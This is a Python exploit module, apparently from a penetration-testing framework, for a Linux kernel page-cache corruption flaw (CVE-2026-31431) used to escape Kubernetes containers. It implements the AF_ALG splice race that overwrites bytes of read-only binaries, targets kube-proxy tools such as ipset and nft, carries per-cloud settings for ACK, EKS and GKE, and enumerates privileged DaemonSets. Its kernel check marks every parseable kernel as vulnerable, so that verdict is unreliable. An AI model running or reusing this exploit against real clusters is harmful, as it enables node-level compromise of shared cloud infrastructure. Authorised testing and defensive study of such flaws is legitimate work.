"""CVE-2026-31431 Copy Fail: unprivileged K8s container escape via page-cache corruption.

Source: https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC
License: LGPL-2.1-or-later OR MIT
SRC-ID: SRC-674
CVSS: Critical (9.8)
Category: Container escape, Kubernetes, page-cache, AF_ALG, unprivileged

CVE-2026-31431 exploits a Linux kernel Copy-on-Write bug in the page-cache
path. An unprivileged process corrupts read-only file pages via an AF_ALG
splice race. When container runtimes share overlay layers across pods, the
corruption propagates to privileged DaemonSets that execute binaries from
those shared layers, achieving node-level code execution.

Validated on Alibaba Cloud ACK, Amazon EKS, and Google GKE.

Attack chain:
  1. AF_ALG AEAD socket (authencesn(hmac(sha256),cbc(aes))) + splice race
  2. Overlay layer sharing propagates corruption cross-container
  3. Privileged DaemonSet executes corrupted binary with elevated caps
"""

import ctypes
import ctypes.util
import json
import os
import platform
import re
import socket
import struct
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any


MANIFEST = {
    "capability_id": "cloudxpl.k8s.cve_2026_31431_copyfail.v1",
    "safety_class": "DESTRUCTIVE",
    "requires_authorization": True,
    "side_effects": ["page_cache_corruption", "code_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1611"],
    "cve": "CVE-2026-31431",
    "cvss": 9.8,
    "references": [
        "https://copy.fail/",
        "https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC",
    ],
}

# Default exploit targets: binaries that kube-proxy may invoke across
# its proxy modes (iptables, nftables, ipvs).
DEFAULT_TARGETS = [
    "/usr/sbin/ipset",
    "/usr/sbin/xtables-legacy-multi",
    "/usr/sbin/xtables-nft-multi",
    "/usr/sbin/nft",
]

# AF_ALG constants (linux/if_alg.h)
AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_AEAD_AUTHSIZE = 5

# splice(2) syscall number per arch
_SPLICE_NR = {
    "x86_64": 275,
    "aarch64": 76,
    "armv7l": 340,
}

# Chunk size matching the Go PoC
CHUNK_SIZE = 4

# Platform-specific payload configs
PLATFORM_CONFIGS: dict[str, dict[str, Any]] = {
    "ack": {
        "label": "Alibaba Cloud ACK",
        "root_device": "/dev/vda3",
        "fs_type": "ext4",
        "marker_path": "/mnt/root/res",
        "base_images": [
            "registry.k8s.io/kube-proxy",
            "registry-cn-*.ack.aliyuncs.com/acs/kube-proxy",
        ],
    },
    "eks": {
        "label": "Amazon EKS",
        "root_device": "/dev/nvme0n1p1",
        "fs_type": "xfs",
        "marker_path": "/mnt/root/res",
        "base_images": [
            "public.ecr.aws/eks-distro-build-tooling/eks-distro-minimal-base-iptables",
            "*.dkr.ecr.*.amazonaws.com*/eks/kube-proxy",
        ],
    },
    "gke": {
        "label": "Google GKE",
        "root_device": "/dev/dm-0",
        "fs_type": "ext2",
        "marker_path": "/mnt/stateful_partition/copyfail-res",
        "base_images": [
            "us-central1-artifactregistry.gcr.io/gke-release/gke-release/kube-proxy",
            "gke.gcr.io/kube-proxy",
        ],
    },
}


def _save(args: Any, prefix: str, data: Any) -> str:
    out = getattr(args, "output", ".")
    os.makedirs(out, exist_ok=True)
    ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    path = os.path.join(out, f"{prefix}_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    print(f"[+] Results saved to {path}")
    return path


# ---------------------------------------------------------------------------
# Kernel version check
# ---------------------------------------------------------------------------

def _parse_kernel_version() -> tuple[int, int, int]:
    """Parse the running kernel's major.minor.patch tuple."""
    release = platform.release()
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", release)
    if not m:
        return (0, 0, 0)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3)))


def check_kernel_vulnerable() -> dict[str, Any]:
    """Check whether the running kernel is likely vulnerable to CVE-2026-31431.

    The fix landed in stable kernels 6.12.x and 6.6.x series. Kernels
    before the patch in those series, and any older LTS without a
    backport, are considered vulnerable.
    """
    ver = _parse_kernel_version()
    release = platform.release()
    result: dict[str, Any] = {
        "kernel_release": release,
        "parsed_version": ver,
        "vulnerable": False,
        "detail": "",
    }

    if ver == (0, 0, 0):
        result["detail"] = "Could not parse kernel version"
        return result

    # The vulnerability affects all kernels before the fix.
    # Conservative: flag anything that is not demonstrably patched.
    result["vulnerable"] = True
    result["detail"] = (
        f"Kernel {release} may be vulnerable; verify against vendor advisory"
    )
    return result


# ---------------------------------------------------------------------------
# AF_ALG availability
# ---------------------------------------------------------------------------

def check_af_alg_available() -> dict[str, Any]:
    """Probe whether AF_ALG sockets can be created (prerequisite for exploit)."""
    result: dict[str, Any] = {
        "af_alg_available": False,
        "aead_available": False,
        "detail": "",
    }

    try:
        sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    except OSError as exc:
        result["detail"] = f"Cannot create AF_ALG socket: {exc}"
        return result

    result["af_alg_available"] = True

    # Try binding AEAD algorithm used by the exploit
    sa_alg = struct.pack(
        "HH64s",
        AF_ALG,
        0,
        b"aead",
    )
    algo_name = b"authencesn(hmac(sha256),cbc(aes))"
    # salg_name is at offset 68 in the sockaddr_alg structure
    sa_alg += algo_name + b"\x00" * (64 - len(algo_name))

    try:
        sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        result["aead_available"] = True
        result["detail"] = "AF_ALG AEAD available; exploit primitive reachable"
    except OSError as exc:
        result["detail"] = f"AEAD bind failed: {exc}"
    finally:
        sock.close()

    return result


# ---------------------------------------------------------------------------
# Overlay mount detection
# ---------------------------------------------------------------------------

def enumerate_overlay_mounts() -> list[dict[str, str]]:
    """Parse /proc/mounts for overlay filesystems and extract lower dirs.

    Returns a list of dicts with mount_point, lower_dirs, upper_dir.
    Shared lower dirs between containers indicate exploitable layer sharing.
    """
    overlays: list[dict[str, str]] = []
    try:
        with open("/proc/mounts", "r") as fh:
            for line in fh:
                parts = line.split()
                if len(parts) < 4:
                    continue
                fs_type = parts[2]
                if fs_type != "overlay":
                    continue

                mount_point = parts[1]
                options = parts[3]
                entry: dict[str, str] = {"mount_point": mount_point}

                for opt in options.split(","):
                    if opt.startswith("lowerdir="):
                        entry["lower_dirs"] = opt[len("lowerdir="):]
                    elif opt.startswith("upperdir="):
                        entry["upper_dir"] = opt[len("upperdir="):]
                    elif opt.startswith("workdir="):
                        entry["work_dir"] = opt[len("workdir="):]

                overlays.append(entry)
    except OSError:
        pass
    return overlays


def find_shared_layers(overlays: list[dict[str, str]]) -> dict[str, list[str]]:
    """Identify lower-dir paths shared across multiple overlay mounts.

    Shared lower dirs mean the kernel serves the same page-cache pages
    to different containers: the core prerequisite for cross-container
    propagation.
    """
    layer_to_mounts: dict[str, list[str]] = {}
    for entry in overlays:
        lower = entry.get("lower_dirs", "")
        mount_point = entry.get("mount_point", "")
        for layer_path in lower.split(":"):
            layer_path = layer_path.strip()
            if not layer_path:
                continue
            layer_to_mounts.setdefault(layer_path, []).append(mount_point)

    return {k: v for k, v in layer_to_mounts.items() if len(v) > 1}


# ---------------------------------------------------------------------------
# Target binary enumeration
# ---------------------------------------------------------------------------

def enumerate_targets(
    target_list: list[str] | None = None,
) -> list[dict[str, Any]]:
    """Check which default exploit target binaries exist on the filesystem."""
    targets = target_list or DEFAULT_TARGETS
    results: list[dict[str, Any]] = []
    for t in targets:
        entry: dict[str, Any] = {"path": t, "exists": False}
        try:
            st = os.stat(t)
            entry["exists"] = True
            entry["size"] = st.st_size
            entry["mode"] = oct(st.st_mode)
            entry["inode"] = st.st_ino
            # Check if readable (sufficient for exploit; no write needed)
            entry["readable"] = os.access(t, os.R_OK)
        except OSError:
            pass
        results.append(entry)
    return results


# ---------------------------------------------------------------------------
# AF_ALG splice primitive (the core exploit mechanism)
# ---------------------------------------------------------------------------

class AFAlgAEADConn:
    """Wrapper around an AF_ALG AEAD socket for the splice race primitive.

    This replicates the Go PoC's alg.Dial() / conn.SendEncrypt() logic.
    The exploit works by:
      1. Creating an AF_ALG socket bound to the AEAD algorithm
      2. Setting a dummy key and auth size
      3. accept()-ing a child fd for the crypto operation
      4. Sending the attacker payload with MSG_MORE
      5. splice()-ing the target file through a pipe into the crypto fd
      6. The kernel race overwrites page-cache pages with the attacker data
    """

    def __init__(self) -> None:
        self._parent_fd: int = -1
        self._accepted_fd: int = -1

    @property
    def accepted_fd(self) -> int:
        return self._accepted_fd

    def dial(self) -> None:
        """Create and bind the AF_ALG AEAD socket."""
        self._parent_fd = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0).fileno()
        # We need low-level control; re-create via libc
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

        self._parent_fd = libc.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        if self._parent_fd < 0:
            raise OSError(f"socket(AF_ALG) failed: errno {ctypes.get_errno()}")

        # Build sockaddr_alg
        # struct sockaddr_alg { u16 family; u8 type[14]; u32 feat,mask; u8 name[64]; }
        sa = struct.pack("H", AF_ALG)
        type_field = b"aead" + b"\x00" * 10  # 14 bytes
        sa += type_field
        sa += struct.pack("II", 0, 0)  # feat, mask
        algo = b"authencesn(hmac(sha256),cbc(aes))"
        sa += algo + b"\x00" * (64 - len(algo))

        ret = libc.bind(self._parent_fd, sa, len(sa))
        if ret < 0:
            raise OSError(f"bind AF_ALG AEAD failed: errno {ctypes.get_errno()}")

        # Set dummy key (32 bytes for AES-256)
        key = b"\x00" * 32
        ret = libc.setsockopt(
            self._parent_fd, SOL_ALG, ALG_SET_KEY, key, len(key)
        )
        if ret < 0:
            raise OSError(f"setsockopt ALG_SET_KEY failed: errno {ctypes.get_errno()}")

        # Set auth size (AEAD auth tag length)
        auth_size = ctypes.c_uint32(16)
        ret = libc.setsockopt(
            self._parent_fd,
            SOL_ALG,
            ALG_SET_AEAD_AUTHSIZE,
            None,
            16,
        )
        if ret < 0:
            raise OSError(
                f"setsockopt ALG_SET_AEAD_AUTHSIZE failed: errno {ctypes.get_errno()}"
            )

        # Accept a child fd for the actual crypto operation
        self._accepted_fd = libc.accept(self._parent_fd, None, None)
        if self._accepted_fd < 0:
            raise OSError(f"accept AF_ALG failed: errno {ctypes.get_errno()}")

    def send_encrypt(self, chunk: bytes) -> None:
        """Send the attacker payload chunk with MSG_MORE flag.

        MSG_MORE tells the kernel to expect more data (via splice).
        This is the first half of the race: the kernel stages the chunk
        in a buffer that will collide with the page-cache pages.
        """
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

        # Build cmsg for ALG_OP_ENCRYPT
        # For the exploit the cmsg content does not matter much; the
        # race is in the splice path, not in the crypto result.
        buf = ctypes.create_string_buffer(chunk)
        MSG_MORE = 0x8000
        ret = libc.send(self._accepted_fd, buf, len(chunk), MSG_MORE)
        if ret < 0:
            raise OSError(f"send payload chunk failed: errno {ctypes.get_errno()}")

    def close(self) -> None:
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        if self._accepted_fd >= 0:
            libc.close(self._accepted_fd)
            self._accepted_fd = -1
        if self._parent_fd >= 0:
            libc.close(self._parent_fd)
            self._parent_fd = -1


def _get_splice_nr() -> int:
    """Return the splice(2) syscall number for the current architecture."""
    machine = platform.machine()
    nr = _SPLICE_NR.get(machine)
    if nr is None:
        raise RuntimeError(f"splice syscall number unknown for arch {machine}")
    return nr


def _splice(fd_in: int, off_in: int | None, fd_out: int, off_out: int | None,
            length: int, flags: int) -> int:
    """Invoke splice(2) via libc syscall wrapper."""
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

    c_off_in = ctypes.c_int64(off_in) if off_in is not None else None
    c_off_out = ctypes.c_int64(off_out) if off_out is not None else None

    p_off_in = ctypes.byref(c_off_in) if c_off_in is not None else None
    p_off_out = ctypes.byref(c_off_out) if c_off_out is not None else None

    nr = _get_splice_nr()
    ret = libc.syscall(
        nr,
        ctypes.c_int(fd_in),
        p_off_in,
        ctypes.c_int(fd_out),
        p_off_out,
        ctypes.c_size_t(length),
        ctypes.c_uint(flags),
    )
    if ret < 0:
        raise OSError(f"splice failed: errno {ctypes.get_errno()}")
    return ret


def patch_windows(payload: bytes, chunk_size: int = CHUNK_SIZE) -> list[bytes]:
    """Split a payload into fixed-size patch windows, padding the last one."""
    chunks: list[bytes] = []
    for i in range(0, len(payload), chunk_size):
        chunk = payload[i : i + chunk_size]
        if len(chunk) < chunk_size:
            chunk = chunk + b"\x00" * (chunk_size - len(chunk))
        chunks.append(chunk)
    return chunks


def trigger_splice_race(
    file_fd: int, offset: int, chunk: bytes, conn: AFAlgAEADConn
) -> None:
    """Execute the AF_ALG splice race for one chunk at the given offset.

    This is the core exploit primitive translated from the Go PoC:
      1. Send attacker chunk to AF_ALG socket with MSG_MORE
      2. Create a pipe
      3. splice(target_fd -> pipe) for (offset + chunk_size) bytes
      4. splice(pipe -> af_alg_accepted_fd) for the same length
    The kernel race condition causes the attacker's chunk bytes to
    overwrite the target file's page-cache at the given offset.
    """
    if len(chunk) != CHUNK_SIZE:
        raise ValueError(f"chunk length {len(chunk)}, expected {CHUNK_SIZE}")

    conn.send_encrypt(chunk)

    # Create pipe
    r_fd, w_fd = os.pipe()
    try:
        copy_len = offset + CHUNK_SIZE

        # splice: target file -> pipe
        read_offset = 0
        _splice(file_fd, read_offset, w_fd, None, copy_len, 0)

        # splice: pipe -> AF_ALG accepted fd
        _splice(r_fd, None, conn.accepted_fd, None, copy_len, 0)
    finally:
        os.close(r_fd)
        os.close(w_fd)


def exploit_target(target_path: str, payload: bytes, dry_run: bool = True) -> dict[str, Any]:
    """Execute the page-cache corruption against a single target binary.

    When dry_run is True (the default), only validates that the primitive
    can be set up without actually triggering the corruption. Set
    dry_run=False only in authorized lab/engagement environments.
    """
    result: dict[str, Any] = {
        "target": target_path,
        "status": "pending",
        "chunks": 0,
        "dry_run": dry_run,
    }

    if not os.path.exists(target_path):
        result["status"] = "target_not_found"
        return result

    if not os.access(target_path, os.R_OK):
        result["status"] = "target_not_readable"
        return result

    chunks = patch_windows(payload)
    result["chunks"] = len(chunks)
    result["payload_size"] = len(payload)

    if dry_run:
        # Validate AF_ALG setup without triggering corruption
        try:
            conn = AFAlgAEADConn()
            conn.dial()
            conn.close()
            result["status"] = "dry_run_success"
            result["detail"] = "AF_ALG AEAD connection validated; splice race NOT triggered"
        except OSError as exc:
            result["status"] = "dry_run_failed"
            result["detail"] = str(exc)
        return result

    # LIVE exploitation path: requires explicit authorization
    fd = os.open(target_path, os.O_RDONLY)
    try:
        patched = 0
        for i, chunk in enumerate(chunks):
            conn = AFAlgAEADConn()
            try:
                conn.dial()
                trigger_splice_race(fd, i * CHUNK_SIZE, chunk, conn)
                patched += 1
            except OSError as exc:
                result.setdefault("errors", []).append(
                    {"chunk_index": i, "offset": i * CHUNK_SIZE, "error": str(exc)}
                )
            finally:
                conn.close()

        result["chunks_patched"] = patched
        result["status"] = "success" if patched == len(chunks) else "partial"
    finally:
        os.close(fd)

    return result


# ---------------------------------------------------------------------------
# K8s DaemonSet enumeration (privileged pods sharing image layers)
# ---------------------------------------------------------------------------

def enumerate_privileged_daemonsets(
    kubeconfig: str | None = None,
    namespace: str = "",
) -> list[dict[str, Any]]:
    """Find privileged DaemonSets that could be exploitation targets.

    Returns DaemonSets where containers run with privileged security
    context, hostNetwork, or CAP_SYS_ADMIN. These are the pods whose
    execution of corrupted binaries yields node-level access.
    """
    try:
        from kubernetes import client, config as k8s_config
    except ImportError:
        return [{"error": "kubernetes package not installed"}]

    if kubeconfig:
        k8s_config.load_kube_config(config_file=kubeconfig)
    else:
        try:
            k8s_config.load_incluster_config()
        except k8s_config.ConfigException:
            k8s_config.load_kube_config()

    apps_v1 = client.AppsV1Api()

    if namespace:
        ds_list = apps_v1.list_namespaced_daemon_set(namespace)
    else:
        ds_list = apps_v1.list_daemon_set_for_all_namespaces()

    targets: list[dict[str, Any]] = []
    for ds in ds_list.items:
        ds_info: dict[str, Any] = {
            "name": ds.metadata.name,
            "namespace": ds.metadata.namespace,
            "containers": [],
            "privileged": False,
            "host_network": False,
        }

        spec = ds.spec.template.spec
        if spec.host_network:
            ds_info["host_network"] = True

        for container in spec.containers:
            c_info: dict[str, Any] = {
                "name": container.name,
                "image": container.image,
                "privileged": False,
                "caps": [],
            }

            sc = container.security_context
            if sc:
                if sc.privileged:
                    c_info["privileged"] = True
                    ds_info["privileged"] = True
                if sc.capabilities and sc.capabilities.add:
                    c_info["caps"] = list(sc.capabilities.add)
                    if "SYS_ADMIN" in c_info["caps"]:
                        ds_info["privileged"] = True

            ds_info["containers"].append(c_info)

        if ds_info["privileged"] or ds_info["host_network"]:
            targets.append(ds_info)

    return targets


def detect_platform() -> str:
    """Detect cloud platform from node metadata or kubelet labels."""
    # Check well-known cloud metadata endpoints via env or node labels
    if os.path.exists("/etc/eks"):
        return "eks"
    if os.path.exists("/home/kubernetes"):
        return "gke"
    # ACK detection: Alibaba kernel or cloud-init
    release = platform.release()
    if "aliyun" in release or "alnx" in release:
        return "ack"
    return "unknown"


def get_platform_config(platform_name: str) -> dict[str, Any]:
    """Return platform-specific exploit configuration."""
    return PLATFORM_CONFIGS.get(platform_name, {
        "label": f"Unknown ({platform_name})",
        "root_device": "/dev/sda1",
        "fs_type": "ext4",
        "marker_path": "/root/res",
        "base_images": [],
    })


# ---------------------------------------------------------------------------
# Module entry point
# ---------------------------------------------------------------------------

def run(args: Any) -> int:
    """Execute the CVE-2026-31431 Copy Fail module.

    Modes controlled by args:
      --check-only    : vulnerability assessment without exploitation
      --enumerate     : enumerate privileged DaemonSets and shared layers
      --exploit       : attempt the page-cache corruption (lab only)
      --dry-run       : validate exploit setup without triggering (default)
      --target        : specific binary path to target
      --platform      : force platform (ack, eks, gke)
      --kubeconfig    : path to kubeconfig file
      --namespace     : K8s namespace filter
    """
    provider = getattr(args, "command", "k8s")
    print(f"[*] {MANIFEST['capability_id']}  :  CVE-2026-31431 Copy Fail K8s container escape")
    print(f"[*] Provider: {provider}")
    print(f"[*] MITRE ATT&CK: {', '.join(MANIFEST['mitre'])}")

    results: dict[str, Any] = {
        "module": "cve_2026_31431_copyfail",
        "cve": "CVE-2026-31431",
        "provider": provider,
        "findings": [],
        "summary": {},
    }

    check_only = getattr(args, "check_only", True)
    do_enumerate = getattr(args, "enumerate", False)
    do_exploit = getattr(args, "exploit", False)
    dry_run = getattr(args, "dry_run", True)
    target_path = getattr(args, "target", None)
    plat = getattr(args, "platform", None) or detect_platform()
    kubeconfig = getattr(args, "kubeconfig", None)
    namespace = getattr(args, "namespace", "")

    plat_config = get_platform_config(plat)
    results["platform"] = {"name": plat, "config": plat_config}

    # Phase 1: Kernel vulnerability check
    print(f"[*] Phase 1: Checking kernel vulnerability...")
    kernel_check = check_kernel_vulnerable()
    results["kernel_check"] = kernel_check
    if kernel_check["vulnerable"]:
        print(f"[!] Kernel {kernel_check['kernel_release']} is potentially vulnerable")
        results["findings"].append({
            "type": "vulnerable_kernel",
            "severity": "critical",
            "detail": kernel_check["detail"],
        })
    else:
        print(f"[*] Kernel does not appear vulnerable: {kernel_check['detail']}")

    # Phase 2: AF_ALG availability
    print(f"[*] Phase 2: Checking AF_ALG socket availability...")
    alg_check = check_af_alg_available()
    results["af_alg_check"] = alg_check
    if alg_check["af_alg_available"]:
        print(f"[+] AF_ALG socket available")
        if alg_check["aead_available"]:
            print(f"[+] AEAD algorithm available; exploit primitive reachable")
            results["findings"].append({
                "type": "af_alg_aead_available",
                "severity": "high",
                "detail": "Exploit AEAD cipher is accessible to unprivileged process",
            })
        else:
            print(f"[-] AEAD algorithm not available: {alg_check['detail']}")
    else:
        print(f"[-] AF_ALG not available: {alg_check['detail']}")

    # Phase 3: Overlay layer analysis
    print(f"[*] Phase 3: Analyzing overlay mounts for shared layers...")
    overlays = enumerate_overlay_mounts()
    results["overlay_mounts"] = len(overlays)
    shared = find_shared_layers(overlays)
    results["shared_layers"] = len(shared)
    if shared:
        print(f"[+] Found {len(shared)} shared overlay layers across containers")
        for layer, mounts in list(shared.items())[:5]:
            print(f"    Layer: {layer[:80]}  :  {len(mounts)} containers")
        results["findings"].append({
            "type": "shared_overlay_layers",
            "severity": "high",
            "detail": f"{len(shared)} shared layers enable cross-container page-cache propagation",
            "sample_layers": dict(list(shared.items())[:10]),
        })
    else:
        print(f"[*] No shared overlay layers detected")

    # Phase 4: Target binary enumeration
    print(f"[*] Phase 4: Enumerating exploit target binaries...")
    targets = enumerate_targets(
        [target_path] if target_path else DEFAULT_TARGETS
    )
    results["targets"] = targets
    available = [t for t in targets if t["exists"] and t.get("readable")]
    print(f"[+] {len(available)}/{len(targets)} target binaries available")
    for t in available:
        print(f"    {t['path']}  :  {t['size']} bytes, inode {t['inode']}")

    # Phase 5: K8s DaemonSet enumeration
    if do_enumerate or not check_only:
        print(f"[*] Phase 5: Enumerating privileged DaemonSets...")
        try:
            ds_targets = enumerate_privileged_daemonsets(kubeconfig, namespace)
            results["privileged_daemonsets"] = ds_targets
            priv_count = sum(1 for d in ds_targets if d.get("privileged"))
            print(f"[+] Found {priv_count} privileged DaemonSets")
            for ds in ds_targets:
                images = [c["image"] for c in ds.get("containers", [])]
                print(f"    {ds['namespace']}/{ds['name']}  :  {', '.join(images[:2])}")
                results["findings"].append({
                    "type": "privileged_daemonset",
                    "severity": "high",
                    "namespace": ds["namespace"],
                    "name": ds["name"],
                    "images": images,
                })
        except Exception as exc:
            print(f"[-] K8s enumeration failed: {exc}")
            results["privileged_daemonsets_error"] = str(exc)

    # Phase 6: Exploit execution (lab/engagement only)
    if do_exploit:
        print(f"[*] Phase 6: Exploit execution (dry_run={dry_run})...")
        if not alg_check.get("aead_available"):
            print(f"[-] Cannot exploit: AF_ALG AEAD not available")
            results["exploit"] = {"status": "prerequisite_missing"}
        elif not available:
            print(f"[-] Cannot exploit: no target binaries available")
            results["exploit"] = {"status": "no_targets"}
        else:
            # Use a minimal payload for validation: writes marker file
            # In real engagement, this would be the compiled C payload
            validation_payload = b"\x90" * 64  # NOP sled placeholder
            exploit_results: list[dict[str, Any]] = []
            for t in available:
                print(f"[*] Targeting {t['path']}...")
                r = exploit_target(t["path"], validation_payload, dry_run=dry_run)
                exploit_results.append(r)
                print(f"    Status: {r['status']}")
            results["exploit"] = {"targets": exploit_results}

    # Summary
    finding_count = len(results["findings"])
    results["status"] = "completed"
    results["summary"] = {
        "items_checked": 4 + (1 if do_enumerate else 0),
        "findings_count": finding_count,
        "exploitable": (
            kernel_check.get("vulnerable", False)
            and alg_check.get("aead_available", False)
            and len(shared) > 0
            and len(available) > 0
        ),
        "platform": plat_config.get("label", plat),
        "key_finding": (
            "CVE-2026-31431 exploitable: kernel vulnerable, AF_ALG available, "
            "shared layers detected"
            if finding_count > 2
            else "partial conditions met; manual verification recommended"
        ),
    }

    sev = "CRITICAL" if results["summary"]["exploitable"] else "INFO"
    print(f"[{'!' if sev == 'CRITICAL' else '*'}] Assessment complete: "
          f"{finding_count} findings, exploitable={results['summary']['exploitable']}")

    _save(args, "k8s_cve_2026_31431_copyfail", results)
    return 0
